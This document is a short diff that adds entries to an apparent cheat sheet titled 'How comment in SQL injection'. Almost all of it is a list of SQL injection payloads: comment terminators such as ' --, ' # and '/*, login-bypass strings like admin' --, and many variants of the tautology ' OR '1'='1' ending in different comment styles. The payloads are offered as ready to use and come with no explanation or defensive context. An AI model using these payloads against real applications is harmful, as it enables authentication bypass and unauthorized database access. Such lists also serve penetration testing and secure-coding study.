@@ -1,5 +1,22 @@
 How comment in SQL injection :~
 
+' -- 
+' #
+'/*
 admin' -- 
 admin' #
 admin'/*
+' OR '1'='1' --+
+' OR '1'='1' -- -
+' OR '1'='1' --abc
+' OR '1'='1'/**/
+' OR '1'='1'/*anything*/
+' OR '1'='1'%23
+' OR '1'='1'/*comment*/--
+' OR '1'='1'/*--*/
+' OR '1'='1'/*123*/
+' OR '1'='1'//comment
+' OR '1'='1'//--
+' OR '1'='1'--test
+' OR '1'='1'; -- 
+' OR '1'='1'#comment
